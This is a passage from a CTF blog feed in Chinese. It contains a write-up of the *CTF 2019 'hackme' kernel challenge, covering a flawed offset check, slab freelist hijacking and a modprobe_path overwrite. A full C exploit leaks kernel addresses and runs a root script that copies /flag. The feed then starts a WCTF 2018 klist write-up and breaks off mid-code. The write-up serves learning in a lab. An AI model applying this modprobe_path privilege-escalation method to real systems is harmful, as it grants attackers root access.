class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> arg struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_4)   ; XREF: hackme_ioctl/r</span><br><span class="line"><span class="number">00000000</span> idx dq ?                                ; XREF: hackme_ioctl+<span class="number">46</span>/r</span><br><span class="line"><span class="number">00000000</span>                                         ; hackme_ioctl:loc_8E/r ...</span><br><span class="line"><span class="number">00000008</span> content dq ?                            ; XREF: hackme_ioctl+<span class="number">51</span>/r</span><br><span class="line"><span class="number">00000008</span>                                         ; hackme_ioctl+<span class="number">99</span>/r ...</span><br><span class="line"><span class="number">00000010</span> size dq ?                               ; XREF: hackme_ioctl+<span class="number">4</span>D/r</span><br><span class="line"><span class="number">00000010</span>                                         ; hackme_ioctl+<span class="number">95</span>/r ...</span><br><span class="line"><span class="number">00000018</span> offset dq ?                             ; XREF: hackme_ioctl+<span class="number">49</span>/r</span><br><span class="line"><span class="number">00000018</span>                                         ; hackme_ioctl+<span class="number">91</span>/r</span><br><span class="line"><span class="number">00000020</span> arg ends</span><br></pre></td></tr></table></figure><p>下面是分析出来的结构体，可以看到题目实现了四个较为基本的功能，增加堆块，删除堆块，修改堆块，读取堆块。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里需要注意的对于读写的时候检测offset的方式是 <code>offset+size&lt;(unsigned __int64)size</code> 这里可以看出来存在向上溢出任意地址的读和写。</p><p>kernel使用的堆分配机制是Buddy System和Slab分配器。而Slab分配器是类似于ptmalloc中的fastbin。kmem_cache_cpu中的freelist指向一个slab中第一个空闲的object，接着object存在指针指向后面空闲的object。而这个指针是很类似于fastbin，我们如果修改的话可以实现任意地址分配堆块。</p><h3 id="modprobe-path利用原理"><a href="#modprobe-path利用原理" class="headerlink" title="modprobe_path利用原理"></a>modprobe_path利用原理</h3><p>首先，什么是modprobe呢？根据维基百科的说法：“modprobe是一个Linux程序，最初由Rusty Russell编写，用于在Linux内核中添加一个可加载的内核模块，或者从内核中移除一个可加载的内核模块”。也就是说，它是我们在Linux内核中安装或卸载新模块时都要执行的一个程序。该程序的路径是一个内核全局变量，默认为/sbin/modprobe</p><p>modprobe的路径, 默认是/sbin/modprobe, 存放在内核本身的符号modprobe_path下, 同时，它位于一个可写的内存页中。我们可以通过读取/proc/kallsyms得到它的地址</p><p>其次，当我们执行的文件的类型是系统未知的类型时，将执行modprobe程序（其路径存储在modprobe_path中）。 更准确地说，如果我们对文件签名（又称魔术头）为系统未知的文件调用execve()函数时，它将调用下列函数，并最终调用modprobe</p><p><code>do_execve()</code>=&gt;<code>do_execveat_common()</code>=&gt;<code>bprm_execve()</code>=&gt;<code>exec_binprm()</code>=&gt;<code>search_binary_handler()</code>=&gt;<code>request_module()</code>=&gt;<code>call_modprobe()</code></p><p>所有这些调用最终将执行下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line"><span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line"><span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!argv)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!module_name)</span><br><span class="line"><span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">argv[<span class="number">3</span>] = module_name;<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line"> <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">kfree(argv);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这篇文章中 <a href="https://cv196082.gitee.io/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/">kernel pwn内存任意读写提升权限[2]</a> 提到了call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。然而这个函数的定义可以看出来也是调用了call_usermodehelper_setup和call_usermodehelper_exec，所以猜测这一函数也可以达到一样的效果，结果也证明事实确实如此</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>所以我们的思路就是覆盖掉modprobe_path值为我们期望的值即可。</p><p>那么首先还是需要泄露地址，这里泄露堆地址就不再提了，存在向上任意溢出所以随便怎么泄露都可。</p><p>内核基址的读取需要一点猜测的成分在，可知<code>0</code>号内存<code>0xffff88800017a500</code>之前是已经在用的系统块，那么一定存在一些内核的指针。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154050545.png"                      alt="image-20220810154050545"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154112166.png"                      alt="image-20220810154112166"                ></p><p>可以看到这上面确实存在一个固定函数地址，所以可以跟他计算出基地值。</p><p>虽然我们可以直接泄露出来modprobe_path的地址，并且实现任意分配堆地址分配到指定位置，但是这样会破坏很多周围的数据，我们的想法肯定是值修改modprobe_path的值，所以我们还需要进一步利用。接下来的思路就是将堆块分配到pool上，那么我们就可以篡改pool上的堆指针为modprobe_path的地址，那我们就可以只修改他的值了，那么现在的问题是怎么获取到pool的值呢？</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154529735.png"                      alt="image-20220810154529735"                ></p><p>在mod_tree内存的附近处会存留驱动的地址</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810154831475.png"                      alt="image-20220810154831475"                ></p><p>所以我们可以任意堆分配到这里然后泄露出驱动地址，紧接着任意堆分配到pool最后修改pool中的指针为modprobe_path地址，最后修改modprobe_path的值即可</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] open /dev/hackme failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> heap_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> kernel_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> mod_tree_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> mode_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> pool_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> modprobe_path_addr;</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">2</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">3</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    arg.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">3</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    heap_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x200</span> + <span class="number">0x28</span>;</span><br><span class="line">    arg.size = <span class="number">0x200</span> - <span class="number">0x28</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    kernel_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line">    mod_tree_addr = kernel_addr - <span class="number">0x38ae0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = mod_tree_addr + <span class="number">0x20</span>;</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">5</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">6</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">6</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x8</span>;</span><br><span class="line">    arg.offset = <span class="number">-0x8</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    mode_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line">    pool_addr = mode_addr + <span class="number">0x2400</span>;</span><br><span class="line"></span><br><span class="line">    arg.idx = <span class="number">5</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = pool_addr + <span class="number">0x90</span>;</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr = mod_tree_addr + <span class="number">0x2e960</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">7</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = modprobe_path_addr;</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf + <span class="number">1</span>) = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strncpy</span>(buf, <span class="string">&quot;/home/pwn/copy.sh\x00&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    arg.idx = <span class="number">9</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x18</span>;</span><br><span class="line">    arg.offset = <span class="number">0</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30002</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220810155109129.png"                      alt="image-20220810155109129"                ></p><p>当然其实在劫持到pool这一步也是可以直接使用 <a href="https://cv196082.gitee.io/2022/08/07/WCTF-2018-klist/">WCTF 2018 klist</a> 这道题的利用方式，利用堆溢出泄漏出cred然后修改cred结构体即可，因为这道题目的漏洞相对来说比较严重，所以ptmx劫持栈什么的都是可以的。这篇文章主要是记录没有遇到过的利用方法。</p><hr><p>参考链接：<a class="link"   href="http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87" >http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;这道题依旧是一道kernel的堆题，题目很简单这里简单分析一下&lt;/p&gt;
&lt;figure class=&quot;highlight c</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="modprobe_path" scheme="https://cv196082.gitee.io/tags/modprobe-path/"/>
    
  </entry>
  
  <entry>
    <title>WCTF 2018 klist</title>
    <link href="https://cv196082.gitee.io/2022/08/07/WCTF-2018-klist/"/>
    <id>https://cv196082.gitee.io/2022/08/07/WCTF-2018-klist/</id>
    <published>2022-08-07T09:42:36.000Z</published>
    <updated>2022-08-07T09:43:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目实现的功能很容易看出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x1338</span> )</span><br><span class="line">        <span class="keyword">return</span> select_item(a1, a3);</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt;= <span class="number">0x1338</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1337</span> )</span><br><span class="line">            <span class="keyword">return</span> add_item(a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1339</span> )</span><br><span class="line">            <span class="keyword">return</span> remove_item(a3);</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x133A</span> )</span><br><span class="line">            <span class="keyword">return</span> list_head(a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要实现了对堆块的申请，释放，读写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">add_item</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    __int64 size; <span class="comment">// 